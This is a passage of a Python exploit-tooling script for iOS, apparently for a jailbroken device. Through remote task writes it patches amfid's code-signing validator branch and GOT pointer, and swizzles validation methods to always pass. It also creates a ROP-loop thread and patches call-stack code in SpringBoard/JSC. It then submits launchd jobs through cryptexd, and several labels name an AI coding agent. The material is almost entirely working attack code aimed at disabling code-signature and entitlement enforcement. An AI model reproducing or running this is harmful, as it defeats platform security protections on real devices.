                                    or "status=0x00000000 exit=0"
                                    not in canary_output
                                ):
                                    raise ProtocolError(
                                        "ad-hoc admission canary did not "
                                        "exit cleanly"
                                    )
                            except BaseException as error:
                                adhoc_error = error
                                raise
                            finally:
                                if option_is_patched:
                                    try:
                                        await write_validation_option_pointer(
                                            "restore",
                                            allow_adhoc_pointer,
                                            respect_pointer,
                                        )
                                    except BaseException as error:
                                        if adhoc_error is None:
                                            raise
                                        print(
                                            "amfid-adhoc-restore-error="
                                            f"{error}",
                                            file=sys.stderr,
                                            flush=True,
                                        )
                            restored_got = await read_target(
                                "amfid_respect_upp_got_restored",
                                got_address,
                                8,
                            )
                            if restored_got != respect_pointer:
                                raise ProtocolError(
                                    "AMFI RespectUpp GOT was not restored: "
                                    f"{restored_got.hex()}"
                                )
                            print(
                                "ptrauth-loader-amfid-adhoc-option-probe="
                                f"success loader-pid={args.pid} "
                                f"target-pid={target_pid} restored=1"
                            )
                            return 0

                        if args.amfid_mis_branch_probe is not None:
                            local_dyld_info_address = (
                                scratch + LOCAL_DYLD_INFO_OFFSET
                            )
                            local_dyld_count_address = (
                                scratch + LOCAL_DYLD_COUNT_OFFSET
                            )
                            await write_memory(
                                remote,
                                local_dyld_info_address,
                                b"\0" * 24,
                            )
                            await write_memory(
                                remote,
                                local_dyld_count_address,
                                struct.pack("<I", TASK_DYLD_INFO_COUNT),
                            )
                            local_dyld_result = await call_loader(
                                "task_info_loader_dyld_amfid_branch",
                                image_base + TASK_INFO_STUB_OFFSET,
                                (
                                    task_self,
                                    TASK_DYLD_INFO,
                                    local_dyld_info_address,
                                    local_dyld_count_address,
                                ),
                            )
                            if local_dyld_result & 0xFFFFFFFF:
                                raise ProtocolError(
                                    "loader TASK_DYLD_INFO failed: "
                                    f"{local_dyld_result & 0xFFFFFFFF}"
                                )
                            local_all_image_info = struct.unpack(
                                "<Q",
                                await read_memory(
                                    remote, local_dyld_info_address, 8
                                ),
                            )[0]
                            if local_all_image_info == 0:
                                raise ProtocolError(
                                    "loader TASK_DYLD_INFO returned null"
                                )

                            async def resolve_loader_symbol(
                                label: str, image_path: str, symbol: str
                            ) -> int:
                                local_address = await set_local_string(
                                    image_path
                                )
                                local_image_raw = await call_loader(
                                    "getRemoteImageAddress_loader_" + label,
                                    image_base
                                    + GET_REMOTE_IMAGE_ADDRESS_OFFSET,
                                    (
                                        task_self,
                                        local_all_image_info,
                                        local_address,
                                    ),
                                )
                                local_image = local_image_raw & USER_VA_MASK
                                symbol_address = await set_local_string(symbol)
                                result_raw = await call_loader(
                                    "remoteDlSym_loader_"
                                    + label
                                    + "_"
                                    + symbol.lstrip("_"),
                                    image_base + REMOTE_DLSYM_OFFSET,
                                    (
                                        task_self,
                                        local_image,
                                        symbol_address,
                                    ),
                                )
                                result = result_raw & USER_VA_MASK
                                if local_image == 0 or result == 0:
                                    raise ProtocolError(
                                        f"could not resolve loader-local "
                                        f"{symbol} in {image_path}"
                                    )
                                return result

                            task_suspend_address = (
                                await resolve_loader_symbol(
                                    "libsystem_kernel",
                                    "/usr/lib/system/libsystem_kernel.dylib",
                                    "_task_suspend",
                                )
                            )
                            task_resume_address = (
                                await resolve_loader_symbol(
                                    "libsystem_kernel",
                                    "/usr/lib/system/libsystem_kernel.dylib",
                                    "_task_resume",
                                )
                            )
                            machine_attribute_address = (
                                await resolve_loader_symbol(
                                    "libsystem_kernel",
                                    "/usr/lib/system/libsystem_kernel.dylib",
                                    "_mach_vm_machine_attribute",
                                )
                            )
                            framework_path_address = await set_local_string(
                                AMFI_FRAMEWORK_PATH
                            )
                            framework_base_raw = await call_loader(
                                "getRemoteImageAddress_amfi_framework",
                                image_base + GET_REMOTE_IMAGE_ADDRESS_OFFSET,
                                (
                                    target_task,
                                    all_image_info,
                                    framework_path_address,
                                ),
                            )
                            framework_base = (
                                framework_base_raw & USER_VA_MASK
                            )
                            if framework_base == 0:
                                raise ProtocolError(
                                    "AppleMobileFileIntegrity framework is "
                                    "not loaded in amfid"
                                )
                            context_address = (
                                framework_base
                                + AMFI_VALIDATE_CONTEXT_OFFSET
                            )
                            branch_address = (
                                framework_base
                                + AMFI_VALIDATE_BRANCH_OFFSET
                            )
                            page_address = branch_address & ~(
                                DONOR_PAGE_SIZE - 1
                            )
                            observed_context = await read_target(
                                "amfid_validate_branch_context",
                                context_address,
                                len(AMFI_VALIDATE_CONTEXT_ORIGINAL),
                            )
                            if (
                                observed_context
                                != AMFI_VALIDATE_CONTEXT_ORIGINAL
                            ):
                                raise ProtocolError(
                                    "exact AMFI validator branch context "
                                    "mismatch: "
                                    f"{observed_context.hex()}"
                                )
                            original_branch = (
                                AMFI_VALIDATE_CONTEXT_ORIGINAL[4:8]
                            )
                            cache_value_address = remote_size_address
                            target_suspended = False
                            page_writable = False
                            branch_is_patched = False

                            async def write_validator_branch(
                                label: str,
                                expected: bytes,
                                replacement: bytes,
                            ) -> None:
                                nonlocal target_suspended
                                nonlocal page_writable
                                nonlocal branch_is_patched
                                suspend_result = await call_loader(
                                    "task_suspend_amfid_" + label,
                                    task_suspend_address,
                                    (target_task,),
                                )
                                if suspend_result & 0xFFFFFFFF:
                                    raise ProtocolError(
                                        "task_suspend(amfid) failed: "
                                        f"{suspend_result & 0xFFFFFFFF}"
                                    )
                                target_suspended = True
                                operation_error: BaseException | None = None
                                try:
                                    current = await read_target(
                                        "amfid_validate_branch_" + label,
                                        branch_address,
                                        4,
                                    )
                                    if current != expected:
                                        raise ProtocolError(
                                            "AMFI validator branch changed "
                                            f"before {label}: "
                                            f"{current.hex()}"
                                        )
                                    protect_result = await call_loader(
                                        "mach_vm_protect_amfid_rw_" + label,
                                        image_base
                                        + MACH_VM_PROTECT_STUB_OFFSET,
                                        (
                                            target_task,
                                            page_address,
                                            DONOR_PAGE_SIZE,
                                            0,
                                            VM_PROT_READ
                                            | VM_PROT_WRITE
                                            | VM_PROT_COPY,
                                        ),
                                    )
                                    if protect_result & 0xFFFFFFFF:
                                        raise ProtocolError(
                                            "mach_vm_protect(amfid, RW|COPY) "
                                            "failed: "
                                            f"{protect_result & 0xFFFFFFFF}"
                                        )
                                    page_writable = True
                                    await write_memory(
                                        remote, path_address, replacement
                                    )
                                    write_result = await call_loader(
                                        "task_write_amfid_branch_" + label,
                                        image_base + TASK_WRITE_OFFSET,
                                        (
                                            target_task,
                                            branch_address,
                                            path_address,
                                            len(replacement),
                                        ),
                                    )
                                    if write_result & 0xFFFFFFFF:
                                        raise ProtocolError(
                                            "task_write(amfid branch) failed: "
                                            f"{write_result & 0xFFFFFFFF}"
                                        )
                                    branch_is_patched = (
                                        replacement
                                        == AMFI_VALIDATE_BRANCH_PATCHED
                                    )
                                    verified = await read_target(
                                        "amfid_validate_branch_verify_"
                                        + label,
                                        branch_address,
                                        4,
                                    )
                                    if verified != replacement:
                                        raise ProtocolError(
                                            "AMFI validator branch write did "
                                            f"not verify: {verified.hex()}"
                                        )
                                    await write_memory(
                                        remote,
                                        cache_value_address,
                                        struct.pack("<i", 9),
                                    )
                                    cache_result = await call_loader(
                                        "mach_vm_machine_attribute_amfid_"
                                        + label,
                                        machine_attribute_address,
                                        (
                                            target_task,
                                            page_address,
                                            DONOR_PAGE_SIZE,
                                            1,
                                            cache_value_address,
                                        ),
                                    )
                                    if cache_result & 0xFFFFFFFF:
                                        raise ProtocolError(
                                            "amfid instruction-cache sync "
                                            "failed: "
                                            f"{cache_result & 0xFFFFFFFF}"
                                        )
                                    restore_protection = await call_loader(
                                        "mach_vm_protect_amfid_rx_" + label,
                                        image_base
                                        + MACH_VM_PROTECT_STUB_OFFSET,
                                        (
                                            target_task,
                                            page_address,
                                            DONOR_PAGE_SIZE,
                                            0,
                                            VM_PROT_READ | VM_PROT_EXECUTE,
                                        ),
                                    )
                                    if restore_protection & 0xFFFFFFFF:
                                        raise ProtocolError(
                                            "mach_vm_protect(amfid, RX) "
                                            "failed: "
                                            f"{restore_protection & 0xFFFFFFFF}"
                                        )
                                    page_writable = False
                                except BaseException as error:
                                    operation_error = error
                                    raise
                                finally:
                                    local_cleanup_errors: list[str] = []
                                    if page_writable:
                                        try:
                                            cleanup_protection = (
                                                await call_loader(
                                                    "mach_vm_protect_amfid_"
                                                    "rx_cleanup_"
                                                    + label,
                                                    image_base
                                                    + MACH_VM_PROTECT_STUB_OFFSET,
                                                    (
                                                        target_task,
                                                        page_address,
                                                        DONOR_PAGE_SIZE,
                                                        0,
                                                        VM_PROT_READ
                                                        | VM_PROT_EXECUTE,
                                                    ),
                                                )
                                            )
                                            if (
                                                cleanup_protection
                                                & 0xFFFFFFFF
                                            ):
                                                raise ProtocolError(
                                                    "RX cleanup failed: "
                                                    f"{cleanup_protection & 0xFFFFFFFF}"
                                                )
                                            page_writable = False
                                        except BaseException as error:
                                            local_cleanup_errors.append(
                                                f"protection: {error}"
                                            )
                                    if target_suspended:
                                        try:
                                            resume_result = await call_loader(
                                                "task_resume_amfid_" + label,
                                                task_resume_address,
                                                (target_task,),
                                            )
                                            if resume_result & 0xFFFFFFFF:
                                                raise ProtocolError(
                                                    "task_resume(amfid) "
                                                    "failed: "
                                                    f"{resume_result & 0xFFFFFFFF}"
                                                )
                                            target_suspended = False
                                        except BaseException as error:
                                            local_cleanup_errors.append(
                                                f"resume: {error}"
                                            )
                                    if local_cleanup_errors:
                                        message = "; ".join(
                                            local_cleanup_errors
                                        )
                                        if operation_error is None:
                                            raise ProtocolError(message)
                                        print(
                                            "amfid-branch-local-cleanup-error="
                                            + message,
                                            file=sys.stderr,
                                            flush=True,
                                        )

                            branch_error: BaseException | None = None
                            try:
                                await write_validator_branch(
                                    "install",
                                    original_branch,
                                    AMFI_VALIDATE_BRANCH_PATCHED,
                                )
                                print(
                                    "amfid-mis-branch=active "
                                    f"pid={target_pid} "
                                    f"framework=0x{framework_base:x} "
                                    f"branch=0x{branch_address:x} "
                                    f"hold={args.amfid_policy_hold_seconds:.3f}",
                                    flush=True,
                                )
                                await asyncio.sleep(
                                    args.amfid_policy_hold_seconds
                                )
                            except BaseException as error:
                                branch_error = error
                                raise
                            finally:
                                if branch_is_patched:
                                    try:
                                        await write_validator_branch(
                                            "restore",
                                            AMFI_VALIDATE_BRANCH_PATCHED,
                                            original_branch,
                                        )
                                    except BaseException as error:
                                        if branch_error is None:
                                            raise
                                        print(
                                            "amfid-branch-restore-error="
                                            f"{error}",
                                            file=sys.stderr,
                                            flush=True,
                                        )
                            restored_context = await read_target(
                                "amfid_validate_context_restored",
                                context_address,
                                len(AMFI_VALIDATE_CONTEXT_ORIGINAL),
                            )
                            if (
                                restored_context
                                != AMFI_VALIDATE_CONTEXT_ORIGINAL
                            ):
                                raise ProtocolError(
                                    "AMFI validator context was not restored: "
                                    f"{restored_context.hex()}"
                                )
                            print(
                                "ptrauth-loader-amfid-mis-branch-probe="
                                f"success loader-pid={args.pid} "
                                f"target-pid={target_pid}"
                            )
                            return 0
                        objc_get_class = await resolve_image_symbol(
                            "libobjc",
                            "/usr/lib/libobjc.A.dylib",
                            "_objc_getClass",
                        )
                        sel_register_name = await resolve_image_symbol(
                            "libobjc",
                            "/usr/lib/libobjc.A.dylib",
                            "_sel_registerName",
                        )
                        class_get_instance_method = await resolve_image_symbol(
                            "libobjc",
                            "/usr/lib/libobjc.A.dylib",
                            "_class_getInstanceMethod",
                        )
                        method_get_implementation = await resolve_image_symbol(
                            "libobjc",
                            "/usr/lib/libobjc.A.dylib",
                            "_method_getImplementation",
                        )
                        method_set_implementation = await resolve_image_symbol(
                            "libobjc",
                            "/usr/lib/libobjc.A.dylib",
                            "_method_setImplementation",
                        )
                        class_name = await write_remote_string(
                            "amfid_validator_class", "AMFIPathValidator_ios"
                        )
                        valid_name = await write_remote_string(
                            "amfid_is_valid_selector", "isValid"
                        )
                        entitlements_name = await write_remote_string(
                            "amfid_entitlements_selector",
                            "areEntitlementsValidated",
                        )
                        validate_name = await write_remote_string(
                            "amfid_validate_selector", "validateWithError:"
                        )
                        validator_class = await remote_call(
                            "objc_getClass_AMFIPathValidator_ios",
                            objc_get_class,
                            (class_name,),
                        )
                        if args.amfid_method_inventory is not None:
                            class_copy_method_list = (
                                await resolve_image_symbol(
                                    "libobjc",
                                    "/usr/lib/libobjc.A.dylib",
                                    "_class_copyMethodList",
                                )
                            )
                            method_get_name = await resolve_image_symbol(
                                "libobjc",
                                "/usr/lib/libobjc.A.dylib",
                                "_method_getName",
                            )
                            method_get_type_encoding = (
                                await resolve_image_symbol(
                                    "libobjc",
                                    "/usr/lib/libobjc.A.dylib",
                                    "_method_getTypeEncoding",
                                )
                            )
                            sel_get_name = await resolve_image_symbol(
                                "libobjc",
                                "/usr/lib/libobjc.A.dylib",
                                "_sel_getName",
                            )
                            free_address = await resolve_image_symbol(
                                "libsystem_malloc",
                                "/usr/lib/system/libsystem_malloc.dylib",
                                "_free",
                            )
                            count_address = await write_remote_string(
                                "amfid_method_count", "0000"
                            )
                            method_list = await remote_call(
                                "class_copyMethodList_AMFIPathValidator_ios",
                                class_copy_method_list,
                                (validator_class, count_address),
                            )
                            method_count = struct.unpack(
                                "<I",
                                await read_target(
                                    "amfid_method_count",
                                    count_address,
                                    4,
                                ),
                            )[0]
                            if (
                                validator_class == 0
                                or method_list == 0
                                or not (0 < method_count <= 128)
                            ):
                                raise ProtocolError(
                                    "invalid AMFIPathValidator_ios method "
                                    f"inventory: class=0x{validator_class:x} "
                                    f"list=0x{method_list:x} "
                                    f"count={method_count}"
                                )
                            try:
                                method_entries = struct.unpack(
                                    f"<{method_count}Q",
                                    await read_target(
                                        "amfid_method_list",
                                        method_list,
                                        method_count * 8,
                                    ),
                                )
                                print(
                                    "amfid-method-inventory "
                                    f"class=AMFIPathValidator_ios "
                                    f"count={method_count}"
                                )
                                for index, method in enumerate(
                                    method_entries
                                ):
                                    selector = await remote_call(
                                        f"method_getName_{index}",
                                        method_get_name,
                                        (method,),
                                    )
                                    name_address = await remote_call(
                                        f"sel_getName_{index}",
                                        sel_get_name,
                                        (selector,),
                                    )
                                    type_address = await remote_call(
                                        f"method_getTypeEncoding_{index}",
                                        method_get_type_encoding,
                                        (method,),
                                    )
                                    implementation = await remote_call(
                                        f"method_getImplementation_{index}",
                                        method_get_implementation,
                                        (method,),
                                    )
                                    name_bytes = await read_target(
                                        f"amfid_method_name_{index}",
                                        name_address,
                                        128,
                                    )
                                    type_bytes = await read_target(
                                        f"amfid_method_type_{index}",
                                        type_address,
                                        128,
                                    )
                                    name_end = name_bytes.find(b"\0")
                                    type_end = type_bytes.find(b"\0")
                                    if name_end < 1 or type_end < 1:
                                        raise ProtocolError(
                                            "unterminated Objective-C method "
                                            f"metadata at index {index}"
                                        )
                                    method_name = name_bytes[
                                        :name_end
                                    ].decode("utf-8", "strict")
                                    method_type = type_bytes[
                                        :type_end
                                    ].decode("utf-8", "strict")
                                    print(
                                        "amfid-method "
                                        f"index={index} "
                                        f"selector={method_name!r} "
                                        f"types={method_type!r} "
                                        f"method=0x{method:x} "
                                        f"imp=0x{implementation:x}"
                                    )
                            finally:
                                await remote_call(
                                    "free_AMFIPathValidator_ios_method_list",
                                    free_address,
                                    (method_list,),
                                )
                            print(
                                "ptrauth-loader-amfid-method-inventory="
                                f"success loader-pid={args.pid} "
                                f"target-pid={target_pid}"
                            )
                            return 0
                        valid_selector = await remote_call(
                            "sel_registerName_isValid",
                            sel_register_name,
                            (valid_name,),
                        )
                        entitlements_selector = await remote_call(
                            "sel_registerName_areEntitlementsValidated",
                            sel_register_name,
                            (entitlements_name,),
                        )
                        validate_selector = await remote_call(
                            "sel_registerName_validateWithError",
                            sel_register_name,
                            (validate_name,),
                        )
                        valid_method = await remote_call(
                            "class_getInstanceMethod_isValid",
                            class_get_instance_method,
                            (validator_class, valid_selector),
                        )
                        entitlements_method = await remote_call(
                            "class_getInstanceMethod_areEntitlementsValidated",
                            class_get_instance_method,
                            (validator_class, entitlements_selector),
                        )
                        validate_method = await remote_call(
                            "class_getInstanceMethod_validateWithError",
                            class_get_instance_method,
                            (validator_class, validate_selector),
                        )
                        if (
                            validator_class == 0
                            or valid_method == 0
                            or entitlements_method == 0
                            or validate_method == 0
                        ):
                            raise ProtocolError(
                                "AMFIPathValidator_ios method lookup failed"
                            )
                        original_valid_imp = await remote_call(
                            "method_getImplementation_isValid",
                            method_get_implementation,
                            (valid_method,),
                        )
                        original_entitlements_imp = await remote_call(
                            "method_getImplementation_"
                            "areEntitlementsValidated",
                            method_get_implementation,
                            (entitlements_method,),
                        )
                        original_validate_imp = await remote_call(
                            "method_getImplementation_validateWithError",
                            method_get_implementation,
                            (validate_method,),
                        )
                        if (
                            original_valid_imp == 0
                            or original_entitlements_imp == 0
                            or original_validate_imp == 0
                        ):
                            raise ProtocolError(
                                "AMFIPathValidator_ios returned a null IMP"
                            )
                        signed_getpid_imp = await call_loader(
                            "make_sym_callable_amfid_getpid",
                            image_base + MAKE_SYM_CALLABLE_OFFSET,
                            (getpid_address,),
                        )
                        if signed_getpid_imp == 0:
                            raise ProtocolError(
                                "could not sign the replacement getpid IMP"
                            )

                        patched_methods: list[tuple[str, int, int]] = []
                        swizzle_error: BaseException | None = None
                        try:
                            replaced_valid = await remote_call(
                                "method_setImplementation_isValid",
                                method_set_implementation,
                                (valid_method, signed_getpid_imp),
                            )
                            if replaced_valid == 0:
                                raise ProtocolError(
                                    "isValid swizzle returned a null old IMP"
                                )
                            patched_methods.append(
                                ("isValid", valid_method, original_valid_imp)
                            )
                            replaced_entitlements = await remote_call(
                                "method_setImplementation_"
                                "areEntitlementsValidated",
                                method_set_implementation,
                                (entitlements_method, signed_getpid_imp),
                            )
                            if replaced_entitlements == 0:
                                raise ProtocolError(
                                    "entitlement-validity swizzle returned a "
                                    "null old IMP"
                                )
                            patched_methods.append(
                                (
                                    "areEntitlementsValidated",
                                    entitlements_method,
                                    original_entitlements_imp,
                                )
                            )
                            replaced_validate = await remote_call(
                                "method_setImplementation_validateWithError",
                                method_set_implementation,
                                (validate_method, signed_getpid_imp),
                            )
                            if replaced_validate == 0:
                                raise ProtocolError(
                                    "validateWithError swizzle returned a "
                                    "null old IMP"
                                )
                            patched_methods.append(
                                (
                                    "validateWithError",
                                    validate_method,
                                    original_validate_imp,
                                )
                            )
                            print(
                                "amfid-policy-swizzle=active "
                                f"pid={target_pid} "
                                f"hold={args.amfid_policy_hold_seconds:.3f}",
                                flush=True,
                            )
                            await asyncio.sleep(
                                args.amfid_policy_hold_seconds
                            )
                        except BaseException as error:
                            swizzle_error = error
                            raise
                        finally:
                            swizzle_cleanup_errors: list[str] = []
                            for (
                                method_name,
                                method,
                                original_imp,
                            ) in reversed(patched_methods):
                                try:
                                    restored_previous = await remote_call(
                                        "method_restore_" + method_name,
                                        method_set_implementation,
                                        (method, original_imp),
                                    )
                                    if restored_previous == 0:
                                        raise ProtocolError(
                                            "restore returned a null previous "
                                            "IMP"
                                        )
                                except BaseException as error:
                                    swizzle_cleanup_errors.append(
                                        f"{method_name}: {error}"
                                    )
                            if not swizzle_cleanup_errors:
                                print(
                                    "amfid-policy-swizzle=restored "
                                    f"pid={target_pid}",
                                    flush=True,
                                )
                            elif swizzle_error is None:
                                raise ProtocolError(
                                    "; ".join(swizzle_cleanup_errors)
                                )
                            else:
                                print(
                                    "amfid-policy-swizzle-cleanup-error="
                                    + "; ".join(swizzle_cleanup_errors),
                                    file=sys.stderr,
                                    flush=True,
                                )
                        print(
                            "ptrauth-loader-amfid-policy-probe=success "
                            f"loader-pid={args.pid} target-pid={target_pid}"
                        )
                        return 0

                    dlopen_address = await resolve_image_symbol(
                        "libdyld",
                        "/usr/lib/system/libdyld.dylib",
                        "_dlopen",
                    )
                    dlsym_address = await resolve_image_symbol(
                        "libdyld",
                        "/usr/lib/system/libdyld.dylib",
                        "_dlsym",
                    )
                    pthread_create_address = await resolve_image_symbol(
                        "libsystem_pthread",
                        "/usr/lib/system/libsystem_pthread.dylib",
                        "_pthread_create",
                    )
                    pthread_exit_address = await resolve_image_symbol(
                        "libsystem_pthread",
                        "/usr/lib/system/libsystem_pthread.dylib",
                        "_pthread_exit",
                    )
                    pthread_join_address = await resolve_image_symbol(
                        "libsystem_pthread",
                        "/usr/lib/system/libsystem_pthread.dylib",
                        "_pthread_join",
                    )
                    pthread_get_stackaddr_address = (
                        await resolve_image_symbol(
                            "libsystem_pthread",
                            "/usr/lib/system/libsystem_pthread.dylib",
                            "_pthread_get_stackaddr_np",
                        )
                    )
                    pthread_get_stacksize_address = (
                        await resolve_image_symbol(
                            "libsystem_pthread",
                            "/usr/lib/system/libsystem_pthread.dylib",
                            "_pthread_get_stacksize_np",
                        )
                    )
                    rop_loop_raw = struct.unpack(
                        "<Q",
                        await read_memory(
                            remote,
                            image_base + ROP_LOOP_STORAGE_OFFSET,
                            8,
                        ),
                    )[0]
                    rop_loop = rop_loop_raw & USER_VA_MASK
                    if rop_loop == 0:
                        raise ProtocolError(
                            "prepareForMagic produced a null ROP loop"
                        )
                    signed_rop_loop = await call_loader(
                        "make_sym_callable_jsc_pthread",
                        image_base + MAKE_SYM_CALLABLE_OFFSET,
                        (rop_loop,),
                    )
                    if signed_rop_loop == 0:
                        raise ProtocolError(
                            "make_sym_callable returned a null ROP loop"
                        )
                    print(
                        "springboard-jsc-pthread-loop "
                        f"raw=0x{rop_loop:x} signed=0x{signed_rop_loop:x}"
                    )

                    baseline_threads = await inventory_target_threads(
                        "before_pthread_create"
                    )
                    pthread_storage = await write_remote_string(
                        "jsc_pthread_storage", "P" * 8
                    )
                    pthread_result = await remote_call(
                        "pthread_create_jsc_worker",
                        pthread_create_address,
                        (pthread_storage, 0, signed_rop_loop, 0),
                    )
                    if pthread_result & 0xFFFFFFFF:
                        raise ProtocolError(
                            "pthread_create for JSC worker failed: "
                            f"{pthread_result & 0xFFFFFFFF}"
                        )
                    jsc_pthread_handle = struct.unpack(
                        "<Q",
                        await read_target(
                            "jsc_pthread_handle", pthread_storage, 8
                        ),
                    )[0]
                    if jsc_pthread_handle == 0:
                        raise ProtocolError(
                            "pthread_create returned a null pthread handle"
                        )
                    baseline_set = set(baseline_threads)
                    loop_threads: tuple[tuple[int, int], ...] = ()
                    for attempt in range(20):
                        await asyncio.sleep(0.01)
                        after_threads = await inventory_target_threads(
                            f"after_pthread_create_{attempt}"
                        )
                        new_threads = tuple(
                            port
                            for port in after_threads
                            if port not in baseline_set
                        )
                        matches: list[tuple[int, int]] = []
                        for port in new_threads:
                            candidate_state = await target_thread_pc_and_sp(
                                f"jsc_candidate_{attempt}_{port:x}", port
                            )
                            if (
                                candidate_state is not None
                                and (
                                    candidate_state[0] & USER_VA_MASK
                                )
                                == rop_loop
                            ):
                                matches.append(
                                    (
                                        port,
                                        candidate_state[1] & USER_VA_MASK,
                                    )
                                )
                        loop_threads = tuple(matches)
                        if len(loop_threads) == 1:
                            break
                        if len(loop_threads) > 1:
                            raise ProtocolError(
                                "multiple new pthreads parked at the exact "
                                f"ROP loop: count={len(loop_threads)}"
                            )
                    if len(loop_threads) != 1:
                        raise ProtocolError(
                            "could not identify the dedicated JSC pthread at "
                            f"the exact ROP loop 0x{rop_loop:x}"
                        )
                    jsc_worker_thread, jsc_worker_sp = loop_threads[0]
                    pthread_stack_top = (
                        await remote_call(
                            "pthread_get_stackaddr_jsc_worker",
                            pthread_get_stackaddr_address,
                            (jsc_pthread_handle,),
                        )
                    ) & USER_VA_MASK
                    pthread_stack_size = await remote_call(
                        "pthread_get_stacksize_jsc_worker",
                        pthread_get_stacksize_address,
                        (jsc_pthread_handle,),
                    )
                    if not (
                        0x10000 <= pthread_stack_size <= 0x4000000
                        and pthread_stack_top > pthread_stack_size
                    ):
                        raise ProtocolError(
                            "dedicated pthread returned invalid stack bounds: "
                            f"top=0x{pthread_stack_top:x} "
                            f"size=0x{pthread_stack_size:x}"
                        )
                    pthread_stack_bottom = (
                        pthread_stack_top - pthread_stack_size
                    )
                    native_call_sp = jsc_worker_sp
                    if not (
                        pthread_stack_bottom + 0x4000
                        <= native_call_sp
                        < pthread_stack_top
                        and native_call_sp & 0xF == 0
                    ):
                        raise ProtocolError(
                            "arbCall native SP would leave the dedicated "
                            "pthread stack: "
                            f"bottom=0x{pthread_stack_bottom:x} "
                            f"saved-sp=0x{jsc_worker_sp:x} "
                            f"call-sp=0x{native_call_sp:x} "
                            f"top=0x{pthread_stack_top:x}"
                        )
                    for offset, (
                        original,
                        replacement,
                    ) in ARB_CALL_NATIVE_PTHREAD_STACK_PATCHES.items():
                        address = image_base + offset
                        observed = await read_memory(remote, address, 4)
                        if observed != original:
                            raise ProtocolError(
                                "arbCall native-stack patch precondition "
                                f"failed at offset 0x{offset:x}: "
                                f"{observed.hex()}"
                            )
                        live_code_patch_originals[offset] = original
                        await write_memory(remote, address, replacement)
                        verified = await read_memory(remote, address, 4)
                        if verified != replacement:
                            raise ProtocolError(
                                "arbCall native-stack patch verification "
                                f"failed at offset 0x{offset:x}: "
                                f"{verified.hex()}"
                            )
                    print(
                        "loader-arbcall-native-pthread-stack=enabled "
                        f"bottom=0x{pthread_stack_bottom:x} "
                        f"saved-sp=0x{jsc_worker_sp:x} "
                        f"call-sp=0x{native_call_sp:x} "
                        f"top=0x{pthread_stack_top:x}"
                    )
                    call_thread = jsc_worker_thread
                    real_thread_pid = await remote_call(
                        "jsc_worker_getpid", getpid_address, ()
                    )
                    if real_thread_pid != target_pid:
                        raise ProtocolError(
                            "dedicated JSC pthread getpid mismatch: "
                            f"{real_thread_pid}"
                        )
                    print(
                        "springboard-real-pthread=success "
                        f"pthread=0x{jsc_pthread_handle:x} "
                        f"mach-thread=0x{jsc_worker_thread:x}"
                    )

                    if cryptexd_mode:
                        if cryptexd_image_base == 0:
                            raise ProtocolError(
                                "validated cryptexd image base is null"
                            )
                        if args.cryptexd_sealed_springboard_job:
                            launch_type1_plist = (
                                CRYPTEXD_SEALED_SPRINGBOARD_PLIST
                            )
                            launch_type1_label = (
                                CRYPTEXD_SEALED_SPRINGBOARD_LABEL
                            )
                            launch_type1_program = (
                                CRYPTEXD_SEALED_SPRINGBOARD_PROGRAM
                            )
                            launch_type1_session = (
                                CRYPTEXD_SEALED_SPRINGBOARD_SESSION_NAME
                            )
                        elif args.cryptexd_springboard_candidate_job:
                            launch_type1_plist = (
                                CRYPTEXD_SPRINGBOARD_CANDIDATE_PLIST
                            )
                            launch_type1_label = (
                                CRYPTEXD_SPRINGBOARD_CANDIDATE_LABEL
                            )
                            launch_type1_program = (
                                CRYPTEXD_SPRINGBOARD_CANDIDATE_PROGRAM
                            )
                            launch_type1_session = (
                                CRYPTEXD_SPRINGBOARD_CANDIDATE_SESSION_NAME
                            )
                        elif args.cryptexd_original_xpcproxy_control:
                            launch_type1_plist = (
                                CRYPTEXD_LAUNCH_TYPE1_ORIGINAL_PLIST
                            )
                            launch_type1_label = (
                                "com.openai.codex.launch-type-canary"
                            )
                            launch_type1_program = "/usr/libexec/xpcproxy"
                            launch_type1_session = CRYPTEXD_SESSION_NAME
                        else:
                            launch_type1_plist = (
                                CRYPTEXD_LAUNCH_TYPE1_COPIED_PLIST
                            )
                            launch_type1_label = (
                                "com.openai.codex.launch-type-canary"
                            )
                            launch_type1_program = (
                                "/var/jb/usr/libexec/"
                                "codex-xpcproxy-launch-canary"
                            )
                            launch_type1_session = CRYPTEXD_SESSION_NAME
                        plist_address = await write_remote_string(
                            "cryptexd_launch_type1_plist",
                            launch_type1_plist,
                        )
                        session_address = await write_remote_string(
                            "cryptexd_session", launch_type1_session
                        )
                        nsarray_name = await write_remote_string(
                            "cryptexd_nsarray_name", "NSArray"
                        )
                        oslaunchdjob_name = await write_remote_string(
                            "cryptexd_oslaunchdjob_name", "OSLaunchdJob"
                        )
                        job_storage = await write_remote_string(
                            "cryptexd_job_storage", "J" * 23
                        )
                        await write_target(
                            "cryptexd_job_storage_zero",
                            job_storage,
                            b"\0" * 24,
                        )
                        objc_get_class = await resolve_image_symbol(
                            "libobjc",
                            "/usr/lib/libobjc.A.dylib",
                            "_objc_getClass",
                        )

                        pool_token = 0
                        dictionary = 0
                        submission_complete = False
                        submission_error: BaseException | None = None
                        try:
                            pool_token = await remote_call(
                                "cryptexd_autoreleasePoolPush",
                                cryptexd_image_base
                                + CRYPTEXD_POOL_PUSH_OFFSET,
                                (),
                            )
                            if pool_token == 0:
                                raise ProtocolError(
                                    "cryptexd autorelease-pool push failed"
                                )

                            nsarray_class = await remote_call(
                                "cryptexd_objc_getClass_NSArray",
                                objc_get_class,
                                (nsarray_name,),
                            )
                            oslaunchdjob_class = await remote_call(
                                "cryptexd_objc_getClass_OSLaunchdJob",
                                objc_get_class,
                                (oslaunchdjob_name,),
                            )
                            nsarray_bound = struct.unpack(
                                "<Q",
                                await read_target(
                                    "cryptexd_NSArray_bind_slot",
                                    cryptexd_image_base
                                    + CRYPTEXD_NSARRAY_CLASS_SLOT_OFFSET,
                                    8,
                                ),
                            )[0]
                            oslaunchdjob_bound = struct.unpack(
                                "<Q",
                                await read_target(
                                    "cryptexd_OSLaunchdJob_bind_slot",
                                    cryptexd_image_base
                                    + CRYPTEXD_OSLAUNCHDJOB_CLASS_SLOT_OFFSET,
                                    8,
                                ),
                            )[0]
                            if (
                                nsarray_class == 0
                                or oslaunchdjob_class == 0
                                or nsarray_bound != nsarray_class
                                or oslaunchdjob_bound != oslaunchdjob_class
                            ):
                                raise ProtocolError(
                                    "cryptexd Objective-C class binding "
                                    "validation failed: "
                                    f"NSArray=0x{nsarray_class:x}/"
                                    f"0x{nsarray_bound:x} "
                                    f"OSLaunchdJob=0x{oslaunchdjob_class:x}/"
                                    f"0x{oslaunchdjob_bound:x}"
                                )
                            print(
                                "cryptexd-class-bindings=validated "
